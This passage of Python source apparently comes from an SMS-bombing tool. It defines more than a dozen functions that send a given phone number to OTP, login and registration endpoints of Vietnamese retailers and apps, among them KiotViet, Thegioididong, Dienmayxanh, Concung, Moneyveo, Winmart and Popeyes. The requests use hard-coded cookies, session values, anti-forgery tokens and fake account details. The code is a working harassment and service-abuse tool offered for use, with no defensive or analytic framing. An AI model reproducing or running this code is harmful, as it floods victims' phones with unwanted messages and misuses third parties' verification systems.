  alo=random_string(8)
  ten=random_string(4)
  phone="0"+phone
  phone=phone.replace("00","")
  phone12="+84"+phone
  cookies={
      "ads":"www.google.com",
      "refcode":"746",
      "time_referer":"1689061704",
      "kvas-uuid":"3a85af4a-1908-48f2-980d-d15395992de5",
      "kvas-uuid-d":"1686469706132",
      "gkvas-uuid":"fc23dc65-4af3-4711-8198-90a46e6b0ca1",
      "gkvas-uuid-d":"1686469706134",
      "kv-session":"94e736d4-493e-4656-9a6a-266817374182",
      "_hjFirstSeen":"1",
      "_hjIncludedInSessionSample_563959":"1",
      "_hjSession_563959":"eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==",
      "_gid":"GA1.2.1638977009.1686469708",
      "_tt_enable_cookie":"1",
      "_ttp":"KrXyjN8UQfZPEg6udl4pOmk7Tnd",
      "_gac_UA-158809353-1":"1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE",
      "_gac_UA-64814867-1":"1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE",
      "source_referer":"%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D",
      "kv-session-d":"1686469712238",
      "_hjSessionUser_563959":"eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==",
      "parent":"77",
      "_ga":"GA1.2.1398574114.1686469708",
      "_ga_6HE3N545ZW":"GS1.1.1686469708.1.1.1686469715.53.0.0",
      "_fw_crm_v":"4721c26b-683b-4e2b-dbb2-62e4d7a8e93d",
}
  headers={
      "authority":"www.kiotviet.vn",
      "accept":"application/json, text/javascript, */*; q=0.01",
      "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
      "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
       "cookie":"ads=www.google.com; refcode=746; time_referer=1689061704; kvas-uuid=3a85af4a-1908-48f2-980d-d15395992de5; kvas-uuid-d=1686469706132; gkvas-uuid=fc23dc65-4af3-4711-8198-90a46e6b0ca1; gkvas-uuid-d=1686469706134; kv-session=94e736d4-493e-4656-9a6a-266817374182; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==; _gid=GA1.2.1638977009.1686469708; _tt_enable_cookie=1; _ttp=KrXyjN8UQfZPEg6udl4pOmk7Tnd; _gac_UA-158809353-1=1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; _gac_UA-64814867-1=1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; source_referer=%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D; kv-session-d=1686469712238; _hjSessionUser_563959=eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==; parent=77; _ga=GA1.2.1398574114.1686469708; _ga_6HE3N545ZW=GS1.1.1686469708.1.1.1686469715.53.0.0; _fw_crm_v=4721c26b-683b-4e2b-dbb2-62e4d7a8e93d",
      "dnt":"1",
      "origin":"https://www.kiotviet.vn",
      "referer":"https://www.kiotviet.vn/dang-ky/?refcode=746",
      "sec-ch-ua":"\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
      "sec-ch-ua-mobile":"?0",
      "sec-ch-ua-platform":"\"Windows\"",
      "sec-fetch-dest":"empty",
      "sec-fetch-mode":"cors",
      "sec-fetch-site":"same-origin",
      "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "x-requested-with":"XMLHttpRequest",
}
  data={
      "phone":phone12,
      "code":alo,
      "name":"lê van sang",
      "email":"",
      "zone":"An Giang - Huyện Châu Phú",
      "merchant":"muabansi",
      "username":phone,
      "industry":"Thời trang",
      "ref_code":"746",
      "industry_id":"77",
      "phone_input":phone,
}
  response=requests.post(
      "https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php",
      cookies=cookies,
      headers=headers,
      data=data,
)
def appota(phone):
    cookies={
        "_fbp":"fb.1.1682774999293.1986473311",
        "_gid":"GA1.2.1851095031.1685335457",
        "_gat_gtag_UA_74938948_3":"1",
        "_ga_SQM4TCSQGX":"GS1.1.1685335456.1.0.1685335456.0.0.0",
        "_gat":"1",
        "_ga_8W5EGNGFDP":"GS1.1.1685335477.2.0.1685335477.0.0.0",
        "_ga":"GA1.1.2134755738.1682774948",
        "amp_6e403e":"jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1it4n3u.1h1it53ob.0.6.6",
        "pay_session":"eyJpdiI6IlhvQ0p3NG9INUhYWkpGeEZVSmVjRGc9PSIsInZhbHVlIjoiUlBXMExaMlMzaGxIWmlTeHFHK29TZHBUVDhBd2daaHZWS0owRXA0UllBRkg1dHYyV3JXYmEwZ0k4YVJocFFEOEh4MVF4QTR1aFBiMFNcL0tnTmZ1SXlBPT0iLCJtYWMiOiJjOGUxZGE4YmZlNTM3NTgzZDA5ZmYzOTY4NTQyNDM3YjJiM2EyODI2MjJiY2RkNDBiYjM1MGZmYWJkZTBhMmE3In0%3D",
}
    headers={
        "authority":"vi.appota.com",
        "accept":"application/json, text/javascript, */*; q=0.01",
        "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
         "cookie":"_fbp=fb.1.1682774999293.1986473311; _gid=GA1.2.1851095031.1685335457; _gat_gtag_UA_74938948_3=1; _ga_SQM4TCSQGX=GS1.1.1685335456.1.0.1685335456.0.0.0; _gat=1; _ga_8W5EGNGFDP=GS1.1.1685335477.2.0.1685335477.0.0.0; _ga=GA1.1.2134755738.1682774948; amp_6e403e=jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1it4n3u.1h1it53ob.0.6.6; pay_session=eyJpdiI6IlhvQ0p3NG9INUhYWkpGeEZVSmVjRGc9PSIsInZhbHVlIjoiUlBXMExaMlMzaGxIWmlTeHFHK29TZHBUVDhBd2daaHZWS0owRXA0UllBRkg1dHYyV3JXYmEwZ0k4YVJocFFEOEh4MVF4QTR1aFBiMFNcL0tnTmZ1SXlBPT0iLCJtYWMiOiJjOGUxZGE4YmZlNTM3NTgzZDA5ZmYzOTY4NTQyNDM3YjJiM2EyODI2MjJiY2RkNDBiYjM1MGZmYWJkZTBhMmE3In0%3D",
        "dnt":"1",
        "origin":"https://vi.appota.com",
        "referer":"https://vi.appota.com/",
        "sec-ch-ua":"\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-origin",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "x-requested-with":"XMLHttpRequest",
}
    data={
        "phone_number":phone,
}
    response=requests.post("https://vi.appota.com/check-phone-register.html",cookies=cookies,headers=headers,data=data)
def meta(phone):
    global thanhcong
    cookies={
        "_ssid":"aggdh2hhalmqx5oq2aagzwqs",
        "_cart_":"23c606fe-c0c3-42eb-8c3f-e829ebca7ec1",
        "__ckmid":"8d30c7a2b7454b67a3441f3f1d1f632c",
        "_gcl_au":"1.1.1985347082.1685327965",
        "_gid":"GA1.2.1851582784.1685327965",
        "_gat_gtag_UA_1035222_8":"1",
        "_gat_UA-1035222-8":"1",
        "_ga":"GA1.2.1183341234.1685327965",
        "_ga_L0FCVV58XQ":"GS1.1.1685327964.1.1.1685327974.0.0.0",
}
    headers={
        "authority":"meta.vn",
        "accept":"application/json, text/plain, */*",
        "accept-language":"en-US,en;q=0.9",
        "content-type":"application/json",
         "cookie":"_ssid=aggdh2hhalmqx5oq2aagzwqs; _cart_=23c606fe-c0c3-42eb-8c3f-e829ebca7ec1; __ckmid=8d30c7a2b7454b67a3441f3f1d1f632c; _gcl_au=1.1.1985347082.1685327965; _gid=GA1.2.1851582784.1685327965; _gat_gtag_UA_1035222_8=1; _gat_UA-1035222-8=1; _ga=GA1.2.1183341234.1685327965; _ga_L0FCVV58XQ=GS1.1.1685327964.1.1.1685327974.0.0.0",
        "origin":"https://meta.vn",
        "referer":"https://meta.vn/account/register",
        "sec-ch-ua":"\"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
        "sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":"\"Windows\"",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-origin",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
}
    params={
        "api_mode":"1",
}
    json_data={
        "api_args":{
            "lgUser":phone,
            "act":"send",
            "type":"phone",
},
        "api_method":"CheckExist",
}
    response=requests.post(
        "https://meta.vn/app_scripts/pages/AccountReact.aspx",
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
)
def blu(phone):
    cookies={
    "DMX_View":"DESKTOP",
    "DMX_Personal":"%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d",
    "_gcl_au":"1.1.804133484.1690973397",
    "_gid":"GA1.2.1071358409.1690973397",
    "_pk_ref.8.8977":"%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
    "_pk_id.8.8977":"c624660949009f11.1690973398.",
    "_pk_ses.8.8977":"1",
    "__zi":"3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1",
    "cebs":"1",
    "_ce.s":"v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116",
    "_fbp":"fb.1.1690973400267.315266557",
    ".AspNetCore.Antiforgery.UMd7_MFqVbs":"CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU",
    "_ce.clock_event":"1",
    "_ce.clock_data":"-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0",
    "lhc_per":"vid|c3330ef02699a3239f3d",
    "_gat_UA-38936689-1":"1",
    "_ga_Y7SWKJEHCE":"GS1.1.1690973397.1.1.1690973847.59.0.0",
    "_ga":"GA1.1.1906131468.1690973397",
    "SvID":"dmxcart2737|ZMo2n|ZMo01",
    "cebsp_":"2",
}
    headers={
    "authority":"www.dienmayxanh.com",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://www.dienmayxanh.com",
    "referer":"https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "phoneNumber":phone,
    "isReSend":"false",
    "sendOTPType":"1",
    "__RequestVerificationToken":"CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0",
}
    response=requests.post(
    "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
    cookies=cookies,
    headers=headers,
    data=data,
)
def tgdt(phone):
    cookies={
    "DMX_Personal":"%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D",
    "__zi":"3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdJVJg_sG11xJDTUh_vXC7zK_awpuaq4Vq3KvD0.1",
    "_pk_id.7.8f7e":"26368263202a729d.1690741327.",
    "_fbp":"fb.1.1690741326923.344831016",
    "_tt_enable_cookie":"1",
    "_ttp":"4ISzilNrZxHb4rxPiS6GakGBcBl",
    "_gid":"GA1.2.235488268.1690867783",
    "lhc_per":"vid|e614b1f7fecec2aa014c",
    ".AspNetCore.Antiforgery.UMd7_MFqVbs":"CfDJ8Btx1b7t0ERJkQbRPSImfvJwbI-XFHuHKzKGLMpDRhzDCGlNxePh8DMv9i21bPLkdrR866k1Vof2tDd9NZ69o_3cyMSQfT34u80TGDeL5gfA359pxVV5QJqeKvBstk-poRG4rRObEOKuPOWc-bxuawc",
    "SvID":"tgcart243|ZMo4n|ZMo4m",
    "_ga_TLRZMSX5ME":"GS1.1.1690974362.5.0.1690974362.60.0.0",
    "_pk_ref.7.8f7e":"%5B%22%22%2C%22%22%2C1690974362%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
    "_pk_ses.7.8f7e":"1",
    "_gat":"1",
    "_ga":"GA1.2.1745564613.1690741327",
    "_gat_UA-918185-25":"1",
    "cebs":"1",
    "_ce.s":"v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1690867783522~vpv~2~lcw~1690974362403",
    "_ce.clock_event":"1",
    "_ce.clock_data":"-781%2C27.67.130.207%2C1%2C15c2f6f9416d00cec8b4f729460293c0",
    "cebsp_":"1",
}
    headers={
    "authority":"www.thegioididong.com",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://www.thegioididong.com",
    "referer":"https://www.thegioididong.com/lich-su-mua-hang/dang-nhap",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "phoneNumber":phone,
    "isReSend":"false",
    "sendOTPType":"1",
    "__RequestVerificationToken":"CfDJ8Btx1b7t0ERJkQbRPSImfvKVlaG4HXJxBzBabPwfuG1Y-fpAjVZx42xlPCyqnJN2nL14Lg5XXAOvLSL6zKwBqpj3ayU5UwjuBy45h-wQx8_1-LL70VWZ6XoBLbe0my_9K6kgjT3SmAyzBd3LYije2oo",
}
    response=requests.post(
    "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
    cookies=cookies,
    headers=headers,
    data=data,
)
def concung(phone):
    cookies={
    "6f1eb01ca7fb61e4f6882c1dc816f22d":"T%2FEqzjRRd5g%3DBpy7szeD03E%3D43LZ4ednzbI%3DBynkYaIZs%2BE%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3DscR4ZwoRNLw%3DVlixtdYRzBU%3DD7U33jY70Ks%3D",
    "__utmz":"65249340.1690866278.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
    "_ga":"GA1.1.1443283851.1690866279",
    "_gcl_au":"1.1.120835214.1690866279",
    "__admUTMtime":"1690866279",
    "_fbp":"fb.1.1690866279595.1654976867",
    "_tt_enable_cookie":"1",
    "_ttp":"1ylpWu8374ONjYCqMW-7JEig8Ja",
    "__iid":"",
    "__iid":"",
    "__su":"0",
    "__su":"0",
    "__RC":"4",
    "__R":"1",
    "__tb":"0",
    "PHPSESSID":"hsd63389severq7ecd56q2la5g",
    "__utma":"65249340.1575700128.1690866278.1690866278.1691049731.2",
    "__utmc":"65249340",
    "__utmt":"1",
    "Srv":"cc205|ZMtdY|ZMtdW",
    "__utmb":"65249340.2.10.1691049731",
    "_ga_DFG3FWNPBM":"GS1.1.1691049732.2.1.1691049738.54.0.0",
    "_ga_BBD6001M29":"GS1.1.1691049732.2.1.1691049739.53.0.0",
    "__uif":"__uid%3A1338693527712144052%7C__ui%3A-1%7C__create%3A1638693527",
    "__IP":"20409708",
}
    headers={
    "authority":"concung.com",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://concung.com",
    "referer":"https://concung.com/dang-nhap.html",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "ajax":"1",
    "classAjax":"AjaxLogin",
     "methodAjax":"sendOtpLogin",
    "customer_phone":phone,
    "static_token":"e633865a31fa27f35b8499e1a75b0a76",
    "id_customer":"0",
}
    response=requests.post("https://concung.com/ajax.html",cookies=cookies,headers=headers,data=data)
def mocha(phone):
    headers={
    "Accept-Language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Connection":"keep-alive",
    "Origin":"https://www.best-inc.vn",
    "Referer":"https://www.best-inc.vn/",
    "Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors",
    "Sec-Fetch-Site":"cross-site",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "accept":"application/json",
    "authorization":"null",
    "content-type":"application/json",
    "lang-type":"vi-VN",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "x-auth-type":"WEB",
    "x-lan":"VI",
    "x-nat":"vi-VN",
    "x-timezone-offset":"7",
}
    json_data={
    "phoneNumber":phone,
    "verificationCodeType":1,
}
    response=requests.post("https://v9-cc.800best.com/uc/account/sendsignupcode",headers=headers,json=json_data)
def money(phone):
    cookies={
    "CaptchaCookieKey":"0",
    "language":"vi",
    "UserTypeMarketing":"L0",
    "__sbref":"aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux",
    "ASP.NET_SessionId":"k1lr5wm2mja2oyaf1zkcrdtu",
    "RequestData":"85580b70-8a3a-4ebc-9746-1009df921f42",
    "_gid":"GA1.2.2031038846.1691083804",
    "UserMachineId_png":"fd5259b0-62a7-41c7-b5c5-e4ff646af322",
    "UserMachineId_etag":"fd5259b0-62a7-41c7-b5c5-e4ff646af322",
    "UserMachineId_cache":"fd5259b0-62a7-41c7-b5c5-e4ff646af322",
    "UserMachineId":"fd5259b0-62a7-41c7-b5c5-e4ff646af322",
    "__RequestVerificationToken":"G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41",
    "_ga_LCPCW0ZYR8":"GS1.1.1691083803.8.1.1691084292.44.0.0",
    "_ga":"GA1.2.149632214.1689613025",
    "Marker":"MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=",
}
    headers={
    "authority":"moneyveo.vn",
    "accept":"*/*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
    "origin":"https://moneyveo.vn",
    "referer":"https://moneyveo.vn/vi/registernew/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "traceparent":"00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with":"XMLHttpRequest",
}
    data={
    "phoneNumber":phone,
}
    response=requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/",cookies=cookies,headers=headers,data=data)
def winmart(phone):
    response=requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
def pop(phone):
  data="{\"phone\":\"phone\",\"firstName\":\"Nguyen\",\"lastName\":\"Hoang\",\"email\":\"Khgf123@gmail.com\",\"password\":\"1262007gdtg\"}"
  data=data.replace("phone",phone)
  head={
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
}
  rq=requests.post("https://api.popeyes.vn/api/v1/register",data=data,headers=head).json()
def tamo(phone):
  data="{\"mobilePhone\":{\"number\":\"phone\"}}".replace("phone",phone)
  head={
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
}
  rq=requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()
def alf(phone):
    headers={
    "authority":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi-VN",
    "brandcode":"ALFRESCOS",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "devicecode":"web",
    "origin":"https://alfrescos.com.vn",
    "pragma":"no-cache",
    "referer":"https://alfrescos.com.vn/",
    "sec-ch-ua":"\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}
    params={
    "culture":"vi-VN",
}
    json_data={
    "phoneNumber":phone,
    "secureHash":"ebe2ae8a21608e1afa1dbb84e944dc89",
    "deviceId":"",
    "sendTime":1691127801586,
    "type":1,
}
    response=requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms",params=params,headers=headers,json=json_data)
def one(phone):
    cookies={
    "_fbp":"fb.1.1695223547462.1065952872",
    "OnCredit_id":"650b0efc4ee260.49012891",
    "fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef":"a73ICjXw5erg4ZoZ3aZyETY04nZBy6OMQpADB6AktII=",
    "GN_USER_ID_KEY":"b74d747a-7c74-4906-bf0c-25e91c4b6350",
    "_hjSessionUser_1876820":"eyJpZCI6ImI5Y2Q1N2EzLWNkNDItNTIxZS1iMWQyLTlkMjRlY2JlYjI5NiIsImNyZWF0ZWQiOjE2OTUyMjM1NDk1MzcsImV4aXN0aW5nIjp0cnVlfQ==",
    "SN5c8116d5e6183":"dqf4ulahhir17p6g0aq1c0efuc",
    "_gid":"GA1.2.1758646184.1696068769",
    "_gat_UA-139625802-1":"1",
    "_hjIncludedInSessionSample_1876820":"0",
